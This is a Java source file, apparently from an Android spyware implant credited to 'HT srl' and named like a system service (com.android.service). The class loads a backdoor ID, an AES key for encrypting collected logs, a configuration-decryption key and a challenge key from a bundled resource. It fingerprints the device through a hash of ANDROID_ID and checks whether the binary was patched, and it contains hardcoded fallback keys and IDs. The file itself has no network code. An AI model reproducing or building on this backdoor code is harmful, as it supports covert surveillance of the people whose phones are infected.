/* *********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 **********************************************/

package com.android.service.crypto;

import android.content.res.Resources;
import android.provider.Settings.Secure;

import com.android.service.R;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.util.Utils;

// TODO: Auto-generated Javadoc
// This class should only be read by Device
/**
 * The Class Keys.
 */
public class Keys {

	/** The use fake. */
	static boolean useFake = Cfg.KEYS;

	/** The singleton. */
	private volatile static Keys singleton;

	/**
	 * Self.
	 * 
	 * @return the keys
	 */
	public static Keys self() {
		if (singleton == null) {
			synchronized (Keys.class) {
				if (singleton == null) {
					if (useFake) {
						singleton = new KeysFake();
					} else {
						singleton = new Keys(true);
					}
				}
			}
		}

		return singleton;
	}

	protected Keys(boolean fromResources) {
		if (fromResources) {
			Resources resources = Status.getAppContext().getResources();

			final String androidId = Secure.getString(Status.getAppContext()
					.getContentResolver(), Secure.ANDROID_ID);

			instanceId = Encryption.SHA1(androidId.getBytes());

			final byte[] resource = Utils.inputStreamToBuffer(
					resources.openRawResource(R.raw.resources), 0); // resources.bin

			backdoorId = Utils.copy(resource, 64, 14);
			aesKey = Utils.copy(resource, 142, 32);
			confKey = Utils.copy(resource, 238, 32);
			challengeKey = Utils.copy(resource, 334, 32);

		}

	}

	// Subversion
	/** The Constant g_Subtype. */
	private static final byte[] subtype = { 'A', 'N', 'D', 'R', 'O', 'I', 'D' };
	// private static final byte[] g_Subtype = { 'A', 'N', 'D', 'R', 'O', 'I',
	// 'D' };

	// 20 bytes that uniquely identifies the device (non-static on purpose)
	/** The g_ instance id. */
	private static byte[] instanceId = { 'b', 'g', '5', 'e', 't', 'G', '8',
			'7', 'q', '2', '0', 'K', 'g', '5', '2', 'W', '5', 'F', 'g', '1' };

	// 16 bytes that uniquely identifies the backdoor, NULL-terminated
	/** The Constant g_BackdoorID. */
	private static byte[] backdoorId = { 'a', 'v', '3', 'p', 'V', 'c', 'k',
			'1', 'g', 'b', '4', 'e', 'R', '2', 'd', '8', 0 };

	// AES key used to encrypt logs
	/** The Constant g_AesKey. */
	private static byte[] aesKey = { '3', 'j', '9', 'W', 'm', 'm', 'D', 'g',
			'B', 'q', 'y', 'U', '2', '7', '0', 'F', 'T', 'i', 'd', '3', '7',
			'1', '9', 'g', '6', '4', 'b', 'P', '4', 's', '5', '2' };

	// AES key used to decrypt configuration
	/** The Constant g_ConfKey. */
	private static byte[] confKey = { 'A', 'd', 'f', '5', 'V', '5', '7', 'g',
			'Q', 't', 'y', 'i', '9', '0', 'w', 'U', 'h', 'p', 'b', '8', 'N',
			'e', 'g', '5', '6', '7', '5', '6', 'j', '8', '7', 'R' };

	// Challenge key
	/** The Constant g_Challenge. */
	private static byte[] challengeKey = { 'f', '7', 'H', 'k', '0', 'f', '5',
			'u', 's', 'd', '0', '4', 'a', 'p', 'd', 'v', 'q', 'w', '1', '3',
			'F', '5', 'e', 'd', '2', '5', 's', 'o', 'V', '5', 'e', 'D' };

	/**
	 * Checks for been binary patched.
	 * 
	 * @return true, if successful
	 */
	public boolean hasBeenBinaryPatched() {
		return Utils.equals(backdoorId, 0, new byte[] { 'a', 'v', '3', 'p',
				'V', 'c', 'k', '1', 'g', 'b', '4', 'e' }, 0, 12);
	}

	/**
	 * Gets the aes key.
	 * 
	 * @return the aes key
	 */
	public byte[] getAesKey() {
		return aesKey;
	}

	/**
	 * Gets the challenge key.
	 * 
	 * @return the challenge key
	 */
	public byte[] getChallengeKey() {
		return challengeKey;
	}

	/**
	 * Gets the conf key.
	 * 
	 * @return the conf key
	 */
	public byte[] getConfKey() {
		return confKey;
	}

	/**
	 * Gets the instance id.
	 * 
	 * @return the instance id
	 */
	public byte[] getInstanceId() {
		return instanceId;
	}

	/**
	 * Gets the builds the id.
	 * 
	 * @return the builds the id
	 */
	public byte[] getBuildId() {
		return backdoorId;
	}

	/**
	 * Gets the subtype.
	 * 
	 * @return the subtype
	 */
	public byte[] getSubtype() {
		return subtype;
	}

}
